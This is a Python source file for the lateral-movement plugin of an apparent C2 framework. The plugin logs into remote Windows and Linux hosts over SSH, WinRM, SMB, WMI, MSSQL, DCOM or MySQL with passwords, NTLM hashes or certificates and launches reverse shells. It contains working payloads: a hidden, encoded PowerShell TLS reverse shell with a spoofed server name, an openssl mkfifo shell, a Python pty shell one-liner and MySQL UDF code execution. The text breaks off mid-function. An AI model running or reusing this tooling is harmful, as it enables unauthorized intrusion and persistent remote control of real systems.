"""Cross-platform C2 token creation plugin supporting SSH, WinRM, SMB, WMI, MSSQL, DCOM, and MySQL/MariaDB using command-line tools.

This plugin establishes connections to remote targets and delivers a reverse shell payload
that connects back to the TornadoRevC2 reverse shell handler over TLS.
The payload is executed in the background to avoid blocking the plugin.
"""

import argparse
import os
import subprocess
import shutil
import time
import base64
import platform
import stat
import tempfile
import urllib.request
from abc import ABC, abstractmethod
from typing import Dict, Optional, Tuple, Any, List, Union

from ..api import plugin, SessionContext

_PLUGIN_DIR = os.path.dirname(os.path.abspath(__file__))
UDF_LIB_DIR = os.path.normpath(
    os.path.join(_PLUGIN_DIR, '..', '..', '..', 'mysql_udf_libraries')
)

UDF_DOWNLOAD_URLS: Dict[Tuple[str, str], str] = {
    ('linux',   'x86_64'): (
        'https://raw.githubusercontent.com/sqlmapproject/sqlmap/refs/heads/master/data/udf/mysql/linux/64/lib_mysqludf_sys.so_'
    ),
    ('windows', 'x86_64'): (
        'https://raw.githubusercontent.com/sqlmapproject/sqlmap/refs/heads/master/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_'
    ),
}

UDF_SONAMES = {
    'windows': 'lib_mysqludf_sys.dll',
    'linux':   'lib_mysqludf_sys.so',
    'unix':    'lib_mysqludf_sys.so',
}

MAKE_TOKEN_USAGE = """
make_token — Establish a C2 session via SSH, WinRM, SMB, WMI, MSSQL, DCOM, or MySQL/MariaDB,
and deliver a reverse shell payload (TLS) or a custom command.

Usage:
  run make_token -x <protocol> --os <os> -i <ip> -u <username> -p <password> -rh <host> -rp <port>
  run make_token -x <protocol> --os <os> -i <ip> -u <username> -H <hash> --nxc -rh <host> -rp <port>
  run make_token -x ssh --os linux -i <ip> -u <username> -c <keyfile> -rh <host> -rp <port>
  run make_token -x winrm --os windows -i <ip> -u <username> --cert-pfx <pfx> -rh <host> -rp <port>
  run make_token -x <protocol> --os <os> -i <ip> -u <username> -p <password> -C "<custom command>"

Protocols & authentication:
  ssh        - password (-p) or private key (-c); Linux, macOS, or Windows
  winrm      - password (-p), NTLM hash (-H), or client cert (--cert-pfx); Windows only
  smb        - password (-p) or NTLM hash (-H); Windows via psexec, Linux via --nxc
  wmi        - password (-p) or NTLM hash (-H); Windows only
  mssql      - password (-p) or NTLM hash (-H); Windows only (enables xp_cmdshell)
  dcom       - password (-p) or NTLM hash (-H); Windows only.
               Command execution via impacket dcomexec.py (DCOM/ShellWindows).
  mysql      - password (-p, may be empty); Windows and Linux.
               Uses sys_exec/sys_eval from lib_mysqludf_sys if already loaded
               on the server, or loads it from --mysql-udf or from the managed
               mysql_udf_libraries/ folder. Reports server capabilities if the
               UDF cannot be loaded.

Options:
  -x, --protocol <proto>     Protocol to use (ssh, winrm, smb, wmi, mssql, dcom, mysql)
  --os <os>                  Target OS: windows, linux, unix (linux and unix share the same payload)
  -i, --ip <ip>              Target IP address
  -P, --port <port>          Custom port (defaults: ssh:22, winrm:5985, smb:445, wmi:135,
                             mssql:1433, dcom:135, mysql:3306)
                             With --cert-pfx, winrm defaults to 5986 (HTTPS).
  -u, --username <user>      Username for authentication
  -p, --password <pass>      Password (use with -p, or -p for ssh)
  -c, --key <path>           SSH private key file (SSH only)
  -H, --hash <ntlm_hash>     NTLM hash (SMB, WinRM, WMI, MSSQL, DCOM)
  --cert-pfx <full_path>     PFX file containing a client certificate + private key (WinRM only).
                             Enables passwordless authentication via the target's
                             Certificate ClientAuth thumbprint->user mapping.
                             Works with both evil-winrm (PEM extracted via openssl)
                             and netexec (native --pfx-cert support).
                             Requires a cert with the clientAuth EKU (see winrm plugin's
                             'cert create-selfsigned --client' and 'exploitcert').
  --cert-pass <pw>           PFX password (default: 'winrmbind')
  --mysql-udf <path>         Optional path to lib_mysqludf_sys.so/.dll. If omitted,
                             the transport looks in mysql_udf_libraries/ (three
                             levels above the plugin) and creates it on demand,
                             downloading from a configured mirror if available.
  --nxc                      Use netexec (nxc) instead of native tools (recommended for Linux targets).
                             With --cert-pfx on WinRM, netexec uses its native PFX support.
  -rh, --callback-host <ip>  Reverse shell listener host (required unless -C is given)
  -rp, --callback-port <port>  Reverse shell listener TLS port (required unless -C is given)
  -C, --custom-payload <cmd>  Execute any custom command instead of the built‑in reverse shell.
                              The command is base64‑encoded and backgrounded automatically,
                              so no quoting/escaping is needed – just pass the raw command.
                              When -C is given, -rh and -rp are not required.

Built‑in payloads (when -C is not used):
  Windows:     PowerShell TLS reverse shell over SSL (encrypted)
  Linux/Unix:  OpenSSL reverse shell over TLS (requires openssl on target)

Examples:
  # Reverse shell via SSH to Linux
  run make_token -x ssh --os linux -i 192.168.1.10 -u root -p secret -rh 10.0.0.5 -rp 4444

  # Reverse shell via WinRM to Windows using NTLM hash
  run make_token -x winrm --os windows -i 192.168.1.20 -u admin -H aad3b435b51404eeaad3b435b51404ee:1234567890abcdef --nxc -rh 10.0.0.5 -rp 4444

  # WinRM with a client certificate (passwordless, from winrm plugin's exploitcert)
  run make_token -x winrm --os windows -i 192.168.1.20 -u Administrator \\
      --cert-pfx /path/to/winrm-certs/winrm-operator-client-*.pfx -C "whoami"

  # Same, using netexec's native PFX support
  run make_token -x winrm --os windows -i 192.168.1.20 -u Administrator \\
      --cert-pfx /path/to/winrm-certs/winrm-operator-client-*.pfx --nxc -C "whoami"

  # Custom command (create directory, backgrounded)
  run make_token -x ssh --os linux -i 192.168.1.10 -u root -p secret -C "mkdir /tmp/hello"

  # Custom reverse shell with environment variables (no manual quoting needed)
  run make_token -x ssh --os linux -i 192.168.1.10 -u root -p secret -C export RHOST=10.0.0.5;export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

  # SMB to Windows with psexec (no --nxc)
  run make_token -x smb --os windows -i 192.168.1.30 -u admin -p pass -rh 10.0.0.5 -rp 4444

  # WMI to Windows (uses impacket wmiexec by default, or --nxc for netexec)
  run make_token -x wmi --os windows -i 192.168.1.50 -u admin -p pass -rh 10.0.0.5 -rp 4444

  # MSSQL to Windows (enables xp_cmdshell automatically)
  run make_token -x mssql --os windows -i 192.168.1.60 -u sa -p pass -rh 10.0.0.5 -rp 4444

  # DCOM to Windows via impacket dcomexec.py
  run make_token -x dcom --os windows -i 192.168.1.80 -u admin -p pass -rh 10.0.0.5 -rp 4444

  # MySQL with auto UDF load (needs lib_mysqludf_sys in mysql_udf_libraries/)
  run make_token -x mysql --os linux -i 192.168.1.70 -u root -p '' -rh 10.0.0.5 -rp 4444

  # MySQL with an explicit UDF path
  run make_token -x mysql --os linux -i 192.168.1.70 -u root -p '' \\
      --mysql-udf /opt/udf/lib_mysqludf_sys.so -rh 10.0.0.5 -rp 4444

Notes:
  - If -C is given, the custom command is base64‑encoded and executed with nohup (Linux) or Start‑Process (Windows),
    so it runs in the background and does not block the session.
  - For Linux custom commands, ensure the target has the necessary interpreters (e.g., sh, base64).
  - For Windows custom commands, PowerShell will be used to decode and execute.
  - Platform detection is informational only; the payload is chosen based on --os.
  - SSH password authentication requires either plink (with ssh-keyscan) or sshpass installed locally.
  - WinRM certificate authentication requires:
      * A PFX whose cert has the clientAuth EKU (see winrm plugin: 'cert create-selfsigned --client')
      * The target configured via 'exploitcert' (public cert in TrustedPeople, thumbprint->user mapping)
      * The target's WinRM service running with Certificate auth enabled (HTTPS/5986)
      * Either evil-winrm (PEM path, requires openssl) or netexec (native PFX path) installed locally
  - MySQL command execution requires lib_mysqludf_sys to be loadable on the server
    (sys_exec/sys_eval), or to be pushed via --mysql-udf / mysql_udf_libraries/.
    The transport probes first, then attempts to load, and reports server
    capabilities if it cannot proceed.
""".strip()

PLUGIN_INFO = MAKE_TOKEN_USAGE


class RemoteTransportError(Exception):
    """Base exception for remote transport errors."""
    pass


class RemoteTransport(ABC):
    DEFAULT_PORTS = {
        'ssh': 22,
        'winrm': 5985,
        'smb': 445,
        'wmi': 135,
        'mssql': 1433,
        'dcom': 135,
        'mysql': 3306,
    }

    SUPPORTED_OS = {
        'ssh': ['windows', 'linux', 'macos'],
        'winrm': ['windows'],
        'smb': ['windows', 'linux'],
        'wmi': ['windows'],
        'mssql': ['windows'],
        'dcom': ['windows'],
        'mysql': ['windows', 'linux'],
    }
    
    WANTS_RAW_WINDOWS_PAYLOAD = False

    def __init__(self):
        self.connected = False
        self._platform = None
        self._detected = False
        self._host = None
        self._username = None
        self._target_os = None
        self._password = None
        self._callback_host = None
        self._callback_port = None
        self._port = None
        self._ntlm_hash = None
        self._private_key = None
        self._use_nxc = False

    @abstractmethod
    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
        """Establish connection to remote host."""
        pass

    @abstractmethod
    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                        background: bool = False) -> Tuple[bool, str]:
        """Execute command on remote host. If background=True, detach and return quickly."""
        pass

    @abstractmethod
    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        """Deliver and execute payload on remote host in background."""
        pass

    @abstractmethod
    def close(self):
        """Close connection."""
        pass

    def detect_platform(self) -> str:
        """Detect remote platform: 'windows' or 'linux'."""
        if not self._detected:
            self._platform = self._perform_platform_detection()
            self._detected = True
        return self._platform

    def _perform_platform_detection(self) -> str:
        return "unknown"

    def _check_command(self, command: str) -> bool:
        return shutil.which(command) is not None

    def _run_command(self, cmd: list, timeout: int = 30) -> Tuple[bool, str, str]:
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                shell=False,
            )
            return result.returncode == 0, result.stdout, result.stderr
        except subprocess.TimeoutExpired as e:
            return False, "", f"Command timed out after {timeout}s: {e}"
        except FileNotFoundError as e:
            return False, "", f"Command not found: {e}"
        except Exception as e:
            return False, "", str(e)

    def generate_payload(self, target_os, callback_host, callback_port):
        if target_os == 'windows' and self.WANTS_RAW_WINDOWS_PAYLOAD:
            return self._generate_raw_windows_payload(callback_host, callback_port)
        return self._generate_payload(target_os, callback_host, callback_port)

    def _generate_raw_windows_payload(self, callback_host: str, callback_port: int) -> str:
            ps_script = (f"$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{callback_host}', {callback_port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {{$SslStream.Close();exit}}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()"            )
            return ps_script

    def _generate_payload(self, target_os: str, callback_host: str, callback_port: int) -> str:
        if target_os == 'windows':
            ps_script = (f"$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{callback_host}', {callback_port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {{$SslStream.Close();exit}}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()"            )
            import base64
            encoded = base64.b64encode(ps_script.encode('utf-16le')).decode()
            return f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Start-Process -WindowStyle Hidden -NoNewWindow -FilePath powershell -ArgumentList \'-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded}\'"'
        else:
            return f'nohup sh -c "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {callback_host}:{callback_port} > /tmp/s; rm /tmp/s" >/dev/null 2>&1 &'

    def _get_os_specific_command(self, cmd_dict: Dict[str, str], target_os: str) -> Optional[str]:
        return cmd_dict.get(target_os)


class SSHTransport(RemoteTransport):
    def __init__(self):
        super().__init__()
        self._ssh_command = None
        self._sshpass_available = False
        self._plink_available = False
        self._use_sshpass = False
        self._use_plink = False
        self._hostkey = None

    def _ensure_dependency(self):
        has_ssh = self._check_command('ssh')
        has_plink = self._check_command('plink')
        self._ssh_command = 'ssh' if has_ssh else None
        self._plink_available = has_plink

        if not (has_ssh or has_plink):
            raise RemoteTransportError(
                "SSH transport requires an SSH client. "
                "Install OpenSSH with 'apt install openssh-client' "
                "or Plink with 'apt install putty-tools'. "
                "For password authentication with OpenSSH, install sshpass "
                "with 'apt install sshpass'."
            )

        self._sshpass_available = self._check_command('sshpass')

    def _get_host_key(self, host: str, port: int) -> Optional[str]:
        try:
            for key_type in ['rsa', 'ecdsa', 'ed25519', 'dsa']:
                cmd = ['ssh-keyscan', '-t', key_type, '-p', str(port), host]
                success, stdout, stderr = self._run_command(cmd, timeout=10)
                if success and stdout.strip():
                    lines = stdout.splitlines()
                    for line in lines:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            if any(keyword in line for keyword in ['ssh-rsa', 'ssh-dss', 'ecdsa-sha2', 'ssh-ed25519']):
                                parts = line.split()
                                if len(parts) >= 3:
                                    return f"{parts[1]} {parts[2]}"
                                elif len(parts) >= 2:
                                    return f"{parts[0]} {parts[1]}"
            cmd = ['ssh-keyscan', '-p', str(port), host]
            success, stdout, stderr = self._run_command(cmd, timeout=10)
            if success and stdout.strip():
                lines = stdout.splitlines()
                for line in lines:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if any(keyword in line for keyword in ['ssh-rsa', 'ssh-dss', 'ecdsa-sha2', 'ssh-ed25519']):
                            parts = line.split()
                            if len(parts) >= 3:
                                return f"{parts[1]} {parts[2]}"
                            elif len(parts) >= 2:
                                return f"{parts[0]} {parts[1]}"
            return None
        except Exception:
            return None

    def _build_plink_cmd(self, command: str) -> List[str]:
        base = ['plink', '-ssh', '-batch', '-no-antispoof']
        base.extend(['-P', str(self._port)])
        if self._hostkey:
            base.extend(['-hostkey', self._hostkey])
        if self._password:
            base.extend(['-pw', self._password])
        if self._private_key:
            base.extend(['-i', self._private_key])
        base.append(f"{self._username}@{self._host}")
        base.append(command)
        return base

    def _build_ssh_cmd(self, command: str, background: bool = False,
                       with_batch: Optional[bool] = None) -> List[str]:
        base = [self._ssh_command]
        base.extend(['-o', 'StrictHostKeyChecking=no'])
        base.extend(['-o', 'UserKnownHostsFile=/dev/null'])
        base.extend(['-o', 'LogLevel=quiet'])
        base.extend(['-o', 'ConnectTimeout=10'])
        base.extend(['-T'])
        if with_batch is None:
            with_batch = not self._use_sshpass
        if with_batch:
            base.extend(['-o', 'BatchMode=yes'])
        if self._use_sshpass and self._password:
            base.extend(['-o', 'PasswordAuthentication=yes'])
        base.extend(['-p', str(self._port)])
        if self._private_key:
            base.extend(['-i', self._private_key])
        base.append(f"{self._username}@{self._host}")
        base.append(command)
        if self._use_sshpass and self._password:
            return ['sshpass', '-p', self._password] + base
        return base

    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
        self._ensure_dependency()
        private_key_path = kwargs.get('private_key')
        use_nxc = kwargs.get('use_nxc', False)
        port = kwargs.get('port')
        if port is None:
            port = self.DEFAULT_PORTS['ssh']
        target_os = kwargs.get('target_os')
        callback_host = kwargs.get('callback_host')
        callback_port = kwargs.get('callback_port')

        self._host = host
        self._username = username
        self._password = password
        self._target_os = target_os
        self._callback_host = callback_host
        self._callback_port = callback_port
        self._port = port
        self._private_key = private_key_path
        self._use_nxc = use_nxc
        self._hostkey = None

        if use_nxc:
            return self._connect_nxc(host, username, password, private_key_path, port)

        if private_key_path:
            if not os.path.exists(private_key_path):
                raise RemoteTransportError(f"Private key file not found: {private_key_path}")
            if not os.access(private_key_path, os.R_OK):
                raise RemoteTransportError(f"Private key file not readable: {private_key_path}")
            self._use_sshpass = False
            self._use_plink = False
        elif password:
            if self._plink_available:
                hostkey = self._get_host_key(host, port)
                if hostkey:
                    self._hostkey = hostkey
                    self._use_plink = True
                    self._use_sshpass = False
                else:
                    if self._sshpass_available:
                        self._use_sshpass = True
                        self._use_plink = False
                    else:
                        raise RemoteTransportError(
                            "Plink requires host key but ssh-keyscan failed, and sshpass is not available. "
                            "Install sshpass (apt install sshpass) or ensure ssh-keyscan works."
                        )
            elif self._sshpass_available:
                self._use_sshpass = True
                self._use_plink = False
            else:
                raise RemoteTransportError(
                    "Password authentication requires either 'plink' (with ssh-keyscan) or 'sshpass'. "
                    "Install plink (apt install putty-tools) or sshpass (apt install sshpass)"
                )
        else:
            raise RemoteTransportError("SSH requires either password or private key")

        if self._use_plink:
            cmd = self._build_plink_cmd("echo PLINK_CONNECTION_SUCCESS")
            success, stdout, stderr = self._run_command(cmd, timeout=15)
            if success and 'PLINK_CONNECTION_SUCCESS' in stdout:
                self.connected = True
                return True
            else:
                if self._sshpass_available:
                    self._use_plink = False
                    self._use_sshpass = True
                    cmd = self._build_ssh_cmd("echo SSH_CONNECTION_SUCCESS", with_batch=False)
                    success, stdout, stderr = self._run_command(cmd, timeout=15)
                    if success and 'SSH_CONNECTION_SUCCESS' in stdout:
                        self.connected = True
                        return True
                    else:
                        error_msg = stderr.strip() if stderr else stdout.strip()
                        raise RemoteTransportError(f"SSH connection test failed (both Plink and sshpass): {error_msg}")
                else:
                    error_msg = stderr.strip() if stderr else stdout.strip()
                    raise RemoteTransportError(f"Plink connection test failed: {error_msg}")
        else:
            cmd = self._build_ssh_cmd("echo SSH_CONNECTION_SUCCESS", with_batch=False)
            success, stdout, stderr = self._run_command(cmd, timeout=15)
            if success and 'SSH_CONNECTION_SUCCESS' in stdout:
                self.connected = True
                return True
            else:
                error_msg = stderr.strip() if stderr else stdout.strip()
                raise RemoteTransportError(f"SSH connection test failed: {error_msg}")

    def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
                     private_key_path: Optional[str] = None, port: int = 22) -> bool:
        if not self._check_command('netexec'):
            raise RemoteTransportError("netexec tool not found. Install with: pip install netexec")

        try:
            cmd = ['netexec', 'ssh', host, '-u', username]
            if port is not None and port != self.DEFAULT_PORTS['ssh']:
                cmd.extend(['--port', str(port)])
            if password:
                cmd.extend(['-p', password])
            elif private_key_path:
                cmd.extend(['-i', private_key_path])
            else:
                raise RemoteTransportError("Password or private key required for netexec SSH")
            cmd.extend(['-x', 'exit'])
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            output = stdout + stderr
            if success or 'authenticated' in output.lower():
                self.connected = True
                return True
            else:
                error_msg = stderr.strip() or stdout.strip() or "Unknown error"
                raise RemoteTransportError(f"netexec SSH connection failed: {error_msg}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"netexec SSH connection failed: {e}")

    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                        background: bool = False) -> Tuple[bool, str]:
        if not self.connected:
            return False, "Not connected"

        target_os = target_os or self._target_os or 'linux'
        if isinstance(command, dict):
            command = self._get_os_specific_command(command, target_os)
            if command is None:
                return False, f"No command found for OS: {target_os}"

        if self._use_nxc:
            try:
                cmd = ['netexec', 'ssh', self._host, '-u', self._username]
                if self._password:
                    cmd.extend(['-p', self._password])
                elif self._private_key:
                    cmd.extend(['-i', self._private_key])
                else:
                    return False, "No authentication available for netexec SSH"
                if self._port is not None and self._port != self.DEFAULT_PORTS['ssh']:
                    cmd.extend(['--port', str(self._port)])
                cmd.extend(['-x', command])
                timeout = 10 if background else 60
                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
                if success:
                    return True, stdout
                else:
                    return False, stderr
            except Exception as e:
                return False, str(e)

        if self._use_plink:
            try:
                cmd = self._build_plink_cmd(command)
                timeout = 10 if background else 60
                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
                if success:
                    return True, stdout
                else:
                    return False, stderr
            except Exception as e:
                return False, str(e)
        else:
            try:
                cmd = self._build_ssh_cmd(command, background=background)
                timeout = 10 if background else 60
                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
                if success:
                    return True, stdout
                else:
                    return False, stderr
            except Exception as e:
                return False, str(e)

    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        return self.execute_command(payload, target_os, background=False)

    def close(self):
        self.connected = False
        self._host = self._username = self._password = self._target_os = None
        self._port = None
        self._private_key = None
        self._use_plink = False
        self._use_sshpass = False
        self._hostkey = None

    def _perform_platform_detection(self) -> str:
        if not self.connected:
            return "unknown"

        if self._use_nxc:
            try:
                cmd = ['netexec', 'ssh', self._host, '-u', self._username]
                if self._password:
                    cmd.extend(['-p', self._password])
                elif self._private_key:
                    cmd.extend(['-i', self._private_key])
                else:
                    return "unknown"
                if self._port is not None and self._port != self.DEFAULT_PORTS['ssh']:
                    cmd.extend(['--port', str(self._port)])
                cmd.extend(['-x', 'uname -s 2>/dev/null || echo Windows'])
                success, stdout, _ = self._run_command(cmd, timeout=10)
                if success:
                    if 'Linux' in stdout or 'Darwin' in stdout:
                        return "linux"
                    elif 'Windows' in stdout or 'CYGWIN' in stdout or 'MSYS' in stdout:
                        return "windows"
                cmd[-1] = 'ver 2>nul || echo Linux'
                success, stdout, _ = self._run_command(cmd, timeout=10)
                if success and ('Microsoft' in stdout or 'Windows' in stdout):
                    return "windows"
                return "linux"
            except Exception:
                return "unknown"

        try:
            if self._use_plink:
                cmd = self._build_plink_cmd('uname -s 2>/dev/null || echo Windows')
            else:
                cmd = self._build_ssh_cmd('uname -s 2>/dev/null || echo Windows', with_batch=False)
            success, stdout, _ = self._run_command(cmd, timeout=10)
            if success:
                if 'Linux' in stdout or 'Darwin' in stdout:
                    return "linux"
                elif 'Windows' in stdout or 'CYGWIN' in stdout or 'MSYS' in stdout:
                    return "windows"
            if self._use_plink:
                cmd = self._build_plink_cmd('ver 2>nul || echo Linux')
            else:
                cmd = self._build_ssh_cmd('ver 2>nul || echo Linux', with_batch=False)
            success, stdout, _ = self._run_command(cmd, timeout=10)
            if success and ('Microsoft' in stdout or 'Windows' in stdout):
                return "windows"
            return "linux"
        except Exception:
            return "unknown"


class WinRMTransport(RemoteTransport):

    WANTS_RAW_WINDOWS_PAYLOAD = True

    def __init__(self):
        super().__init__()
        self._evil_winrm_available = False
        self._cert_pfx = None
        self._cert_pass = None
        self._cert_pem_path = None
        self._key_pem_path = None
        self._temp_dir = None
        self._use_cert = False
        self._interactive_procs = []

    def _ensure_dependency(self):
        self._evil_winrm_available = self._check_command('evil-winrm')
        if not self._evil_winrm_available:
            raise RemoteTransportError(
                "WinRM transport requires 'evil-winrm'. "
                "Install with: gem install evil-winrm"
            )

    def _extract_pfx_to_pem(self):
        if not self._cert_pfx:
            return
        if not os.path.isfile(self._cert_pfx):
            raise RemoteTransportError(f"PFX file not found: {self._cert_pfx}")
        if not self._check_command('openssl'):
            raise RemoteTransportError("openssl required for PFX extraction.")
        try:
            self._temp_dir = tempfile.mkdtemp(prefix='make_token_winrm_cert_')
        except Exception as exc:
            raise RemoteTransportError(f"Could not create temp dir: {exc}")

        cert_path = os.path.join(self._temp_dir, 'cert.pem')
        key_path = os.path.join(self._temp_dir, 'key.pem')

        rc, _, err = self._run_command([
            'openssl', 'pkcs12', '-in', self._cert_pfx,
            '-clcerts', '-nokeys', '-passin', f'pass:{self._cert_pass}',
            '-out', cert_path,
        ], timeout=20)
        if not rc or not os.path.isfile(cert_path):
            self._cleanup_temp_dir()
            raise RemoteTransportError(f"Failed to extract cert: {err.strip()}")

        rc, _, err = self._run_command([
            'openssl', 'pkcs12', '-in', self._cert_pfx,
            '-nocerts', '-nodes', '-passin', f'pass:{self._cert_pass}',
            '-out', key_path,
        ], timeout=20)
        if not rc or not os.path.isfile(key_path):
            self._cleanup_temp_dir()
            raise RemoteTransportError(f"Failed to extract key: {err.strip()}")

        try:
            os.chmod(key_path, 0o600)
        except Exception:
            pass

        self._cert_pem_path = cert_path
        self._key_pem_path = key_path

    def _cleanup_temp_dir(self):
        if self._temp_dir and os.path.isdir(self._temp_dir):
            try:
                shutil.rmtree(self._temp_dir, ignore_errors=True)
            except Exception:
                pass
        self._temp_dir = None
        self._cert_pem_path = None
        self._key_pem_path = None

    def _run_evilwinrm(self, command: str, timeout: int = 60) -> Tuple[bool, str]:
        cmd = ['evil-winrm', '-i', self._host, '-u', self._username]
        if self._use_cert:
            cmd.extend(['-S', '-c', self._cert_pem_path, '-k', self._key_pem_path])
        elif self._ntlm_hash:
            cmd.extend(['-H', self._ntlm_hash])
        elif self._password:
            cmd.extend(['-p', self._password])
        else:
            return False, "No authentication available for evil-winrm"
        if self._port is not None and self._port not in (
                self.DEFAULT_PORTS['winrm'], 5986):
            cmd.extend(['-P', str(self._port)])

        try:
            r = subprocess.run(
                cmd,
                input=f"{command}\nexit\n",
                capture_output=True, text=True, timeout=timeout, shell=False,
            )
        except subprocess.TimeoutExpired:
            return False, f"evil-winrm timed out after {timeout}s"
        except Exception as e:
            return False, f"evil-winrm invocation failed: {e}"

        combined = (r.stdout or '') + (r.stderr or '')
        if combined.strip():
            return True, combined
        return False, "no output from evil-winrm"

    def _launch_interactive_evilwinrm(self) -> Optional[subprocess.Popen]:
        cmd = ['evil-winrm', '-i', self._host, '-u', self._username]
        if self._use_cert:
            cmd.extend(['-S', '-c', self._cert_pem_path, '-k', self._key_pem_path])
        elif self._ntlm_hash:
            cmd.extend(['-H', self._ntlm_hash])
        elif self._password:
            cmd.extend(['-p', self._password])
        else:
            return None
        if self._port is not None and self._port not in (
                self.DEFAULT_PORTS['winrm'], 5986):
            cmd.extend(['-P', str(self._port)])

        try:
            proc = subprocess.Popen(
                cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True,
                text=True,
            )
        except Exception:
            return None

        self._interactive_procs.append(proc)
        return proc

    def _deliver_via_interactive_evilwinrm(self, raw_script: str) -> Tuple[bool, str]:
        proc = self._launch_interactive_evilwinrm()
        if proc is None or proc.stdin is None:
            return False, "Failed to launch interactive evil-winrm"

        try:
            time.sleep(2)
            proc.stdin.write(raw_script + "\r\n")
            proc.stdin.flush()
            return True, "Payload delivered via interactive evil-winrm session"
        except Exception as e:
            return False, f"Interactive evil-winrm delivery failed: {e}"

    def _connect_evilwinrm_cert(self, host, username, port) -> bool:
        saved = (self._host, self._username, self._port)
        self._host, self._username, self._port = host, username, port
        try:
            ok, out = self._run_evilwinrm("echo CERT_AUTH_SUCCESS", timeout=30)
        finally:
            self._host, self._username, self._port = saved
        if ok and 'CERT_AUTH_SUCCESS' in out:
            return True
        raise RemoteTransportError(
            f"Cert auth failed (evil-winrm): {out.strip()[:200]}"
        )

    def _connect_evilwinrm(self, host, username, password=None,
                           ntlm_hash=None, port=5985) -> bool:
        self._host, self._username, self._password = host, username, password
        self._ntlm_hash, self._port = ntlm_hash, port
        self._use_cert = False
        ok, out = self._run_evilwinrm("echo EVILWINRM_CONNECTION_SUCCESS", timeout=30)
        if ok and 'EVILWINRM_CONNECTION_SUCCESS' in out:
            return True
        raise RemoteTransportError(
            f"evil-winrm connection failed: {out.strip()[:200]}"
        )

    def connect(self, host, username, password=None, **kwargs) -> bool:
        self._ensure_dependency()
        if kwargs.get('private_key'):
            raise RemoteTransportError(
                "WinRM does not support private key authentication"
            )

        ntlm_hash = kwargs.get('ntlm_hash')
        cert_pfx = kwargs.get('cert_pfx')
        cert_pass = kwargs.get('cert_pass')
        port = kwargs.get('port')

        self._host = host
        self._username = username
        self._password = password
        self._ntlm_hash = ntlm_hash
        self._target_os = kwargs.get('target_os', 'windows')
        self._callback_host = kwargs.get('callback_host')
        self._callback_port = kwargs.get('callback_port')
        self._use_nxc = False

        if cert_pfx:
            self._use_cert = True
            self._cert_pfx = cert_pfx
            self._cert_pass = cert_pass or 'winrmbind'
            self._port = 5986 if (
                port is None or port == self.DEFAULT_PORTS['winrm']
            ) else port
            if not os.path.isfile(self._cert_pfx):
                raise RemoteTransportError(f"PFX file not found: {self._cert_pfx}")
            self._extract_pfx_to_pem()
            if self._connect_evilwinrm_cert(host, username, self._port):
                self.connected = True
                return True
            return False

        if port is None:
            port = self.DEFAULT_PORTS['winrm']
        self._port = port

        if self._connect_evilwinrm(host, username, password, ntlm_hash, port):
            self.connected = True
            return True
        return False

    def execute_command(self, command, target_os=None, background=False):
        if not self.connected:
            return False, "Not connected"
        target_os = target_os or self._target_os or 'windows'
        if target_os != 'windows':
            return False, "WinRM only supports Windows targets"
        if isinstance(command, dict):
            command = self._get_os_specific_command(command, target_os)
            if command is None:
                return False, f"No command found for OS: {target_os}"

        timeout = 30 if background else 60
        return self._run_evilwinrm(command, timeout=timeout)

    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        if target_os != 'windows':
